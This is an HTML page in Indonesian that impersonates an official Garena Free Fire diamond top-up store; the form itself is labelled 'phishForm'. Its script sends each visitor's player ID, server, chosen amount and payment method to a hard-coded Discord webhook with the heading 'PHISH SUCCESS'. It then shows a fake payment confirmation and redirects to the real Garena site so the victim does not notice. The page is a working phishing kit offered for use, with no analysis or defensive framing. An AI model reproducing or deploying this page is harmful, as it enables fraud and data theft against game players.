<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Top-Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: linear-gradient(145deg, #1e1f2b 0%, #2b2f45 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
        .card { background: rgba(20, 22, 36, 0.95); backdrop-filter: blur(12px); border-radius: 42px; padding: 28px 24px; width: 100%; max-width: 420px; border: 2px solid #ff7b00; box-shadow: 0 30px 50px rgba(255, 123, 0, 0.35); }
        .logo { display: flex; justify-content: center; margin-bottom: 24px; }
        .logo img { width: 140px; filter: drop-shadow(0 0 10px #ff7b00); }
        h2 { color: white; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 6px; letter-spacing: 0.5px; }
        .sub { color: #a0a6c0; text-align: center; font-size: 13px; margin-bottom: 28px; }
        .input-group { margin-bottom: 20px; }
        label { color: #cbd0e6; font-size: 13px; font-weight: 500; display: block; margin-bottom: 6px; margin-left: 8px; }
        input, select { width: 100%; padding: 16px 18px; background: #0f111f; border: 2px solid #2c2f44; border-radius: 30px; font-size: 15px; color: white; outline: none; transition: 0.2s; }
        input:focus, select:focus { border-color: #ff7b00; }
        .nominal-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0 10px; }
        .nominal-item { background: #0f111f; border: 2px solid #2c2f44; border-radius: 24px; padding: 12px 0; text-align: center; color: white; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .nominal-item.active { background: #ff7b00; border-color: #ff7b00; color: #0f111f; }
        .payment-methods { display: flex; gap: 12px; margin: 20px 0; }
        .payment { flex: 1; background: #0f111f; border: 2px solid #2c2f44; border-radius: 30px; padding: 14px 0; text-align: center; color: white; font-weight: 500; cursor: pointer; transition: 0.2s; }
        .payment.active { background: #ff7b00; border-color: #ff7b00; color: black; }
        .total { background: #ff7b0011; border: 2px dashed #ff7b00; border-radius: 30px; padding: 16px 20px; display: flex; justify-content: space-between; margin: 25px 0 20px; }
        .total span:first-child { color: #a0a6c0; font-weight: 500; }
        .total span:last-child { color: #ff7b00; font-weight: 800; font-size: 22px; }
        button { width: 100%; background: #ff7b00; border: none; border-radius: 40px; padding: 18px; color: #0f111f; font-weight: 800; font-size: 18px; cursor: pointer; box-shadow: 0 10px 25px #ff7b00; transition: 0.2s; border: 2px solid #ff7b00; }
        button:hover { background: #ff9100; transform: scale(1.02); }
        .footer-note { text-align: center; margin-top: 24px; color: #5c6180; font-size: 11px; }
        .footer-note span { color: #ff7b00; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <!-- PAKE GAMBAR LOKAL -->
            <img src="images/ff-logo.png" alt="FF Logo" onerror="this.src='https://via.placeholder.com/140x50/ff7b00/000000?text=Free+Fire'">
        </div>
        <h2>TOP UP DIAMOND</h2>
        <div class="sub">Isi data dengan benar, diamond langsung masuk</div>

        <form id="phishForm">
            <div class="input-group">
                <label>ðŸ”‘ ID Player</label>
                <input type="text" id="playerId" placeholder="Masukkan ID Free Fire" required>
            </div>

            <div class="input-group">
                <label>ðŸŽ® Server</label>
                <select id="server">
                    <option value="Indonesia">Indonesia</option>
                    <option value="Singapore">Singapore</option>
                    <option value="Thailand">Thailand</option>
                    <option value="Brazil">Brazil</option>
                </select>
            </div>

            <label>ðŸ’Ž Pilih Nominal</label>
            <div class="nominal-grid" id="nominalGrid">
                <div class="nominal-item" data-nominal="70">70</div>
                <div class="nominal-item active" data-nominal="140">140</div>
                <div class="nominal-item" data-nominal="355">355</div>
                <div class="nominal-item" data-nominal="720">720</div>
                <div class="nominal-item" data-nominal="1450">1450</div>
                <div class="nominal-item" data-nominal="3000">3000</div>
            </div>
            <input type="hidden" id="selectedNominal" value="140">

            <label>ðŸ’³ Metode Pembayaran</label>
            <div class="payment-methods" id="paymentMethods">
                <div class="payment active" data-payment="GOPAY">GOPAY</div>
                <div class="payment" data-payment="DANA">DANA</div>
                <div class="payment" data-payment="OVO">OVO</div>
            </div>
            <input type="hidden" id="selectedPayment" value="GOPAY">

            <div class="total">
                <span>Total Bayar</span>
                <span id="totalPrice">Rp 28.500</span>
            </div>

            <button type="submit">ðŸ”’ BAYAR SEKARANG</button>
        </form>
        <div class="footer-note">Â© 2025 Garena International. <span>Top-up aman & cepat</span></div>
    </div>

    <script>
        // WEBHOOK SAMA DENGAN YANG DI LOGIN
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1474995590327828643/Hsj2F327G7j8_kmojLtpBD3PUekumPhmUw7pAJjSKdeoyaL-9fT-h9pMNdzQF0liyUei';

        // Pilih nominal
        document.querySelectorAll('.nominal-item').forEach(el => {
            el.addEventListener('click', function() {
                document.querySelectorAll('.nominal-item').forEach(e => e.classList.remove('active'));
                this.classList.add('active');
                let nominal = this.getAttribute('data-nominal');
                document.getElementById('selectedNominal').value = nominal;
                let price = nominal == 70 ? '14.000' : nominal == 140 ? '28.500' : nominal == 355 ? '71.000' : nominal == 720 ? '142.000' : nominal == 1450 ? '283.000' : '570.000';
                document.getElementById('totalPrice').innerText = 'Rp ' + price;
            });
        });

        // Pilih metode bayar
        document.querySelectorAll('.payment').forEach(el => {
            el.addEventListener('click', function() {
                document.querySelectorAll('.payment').forEach(e => e.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('selectedPayment').value = this.getAttribute('data-payment');
            });
        });

        // Submit form
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();

            let id = document.getElementById('playerId').value;
            let server = document.getElementById('server').value;
            let nominal = document.getElementById('selectedNominal').value;
            let payment = document.getElementById('selectedPayment').value;

            if (!id) {
                alert('Masukin ID dulu, tolol!');
                return;
            }

            let data = {
                content: '@everyone **DATA TOP-UP FREE FIRE MENTAH**',
                embeds: [{
                    title: 'ðŸ”¥ PHISH SUCCESS (TOP-UP) ðŸ”¥',
                    color: 16744704,
                    fields: [
                        { name: 'ID PLAYER', value: '```' + id + '```', inline: true },
                        { name: 'SERVER', value: '```' + server + '```', inline: true },
                        { name: 'NOMINAL', value: '```' + nominal + ' Diamond```', inline: true },
                        { name: 'METODE', value: '```' + payment + '```', inline: true },
                        { name: 'TIMESTAMP', value: '<t:' + Math.floor(Date.now() / 1000) + ':F>', inline: false }
                    ],
                    footer: { text: 'Architect 01 â€“ Â© RianModss' }
                }]
            };

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(res => {
                if (res.ok) {
                    alert('Pembayaran berhasil! Tunggu diamond masuk 2x24 jam');
                    window.location.href = 'https://ff.garena.com/';
                } else {
                    alert('Gagal, coba lagi nanti.');
                }
            })
            .catch(() => alert('Error jaringan.'));
        });
    </script>
</body>
</html>
